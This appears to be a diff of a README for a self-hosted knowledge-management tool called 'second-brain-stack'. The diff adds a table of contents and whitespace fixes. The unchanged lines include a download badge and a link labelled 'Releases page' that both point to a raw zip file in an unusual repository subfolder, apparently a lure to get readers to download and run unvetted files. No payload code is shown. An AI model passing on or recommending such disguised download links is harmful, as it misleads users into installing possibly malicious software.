@@ -9,6 +9,17 @@
 <!-- AUTO-PACKAGE-BADGES:END -->
 [![Download](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip)
 
+## Table of Contents
+1. [📖 Overview](#-overview)
+2. [🚀 Getting Started](#-getting-started)
+3. [📥 Download & Install](#-download--install)
+4. [🌟 Features](#-features)
+5. [🔧 Configuration](#-configuration)
+6. [👩‍💻 Support](#-support)
+7. [🗨 Community](#-community)
+8. [🎉 Updates](#-updates)
+9. [🌐 Learn More](#-learn-more)
+
 ## 📖 Overview
 
 Welcome to **second-brain-stack**, the ultimate self-hosted knowledge management system. This application helps you organize and retrieve your thoughts, ideas, and information with ease. Enhance your experience with AI-powered search, knowledge graphs, and conversational interfaces.
@@ -34,7 +45,7 @@ Once you're on the Releases page, follow these steps:
 
 1. **Select the Latest Release**
    - Look for the most recent version listed on the page.
-   
+
 2. **Download the Appropriate Package**
    - Choose the file that matches your operating system. For example, if you're on Windows, look for the `.exe` file.
 
@@ -77,6 +88,6 @@ Keep an eye on the Releases page for updates and new features. We regularly impr
 
 ## 🌐 Learn More
 
-For more details about **second-brain-stack**, check out the official documentation in the repository. It covers everything from advanced features to troubleshooting common issues. 
+For more details about **second-brain-stack**, check out the official documentation in the repository. It covers everything from advanced features to troubleshooting common issues.
 
 [Visit the Releases page](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip) again to download updates and new features as they become available.
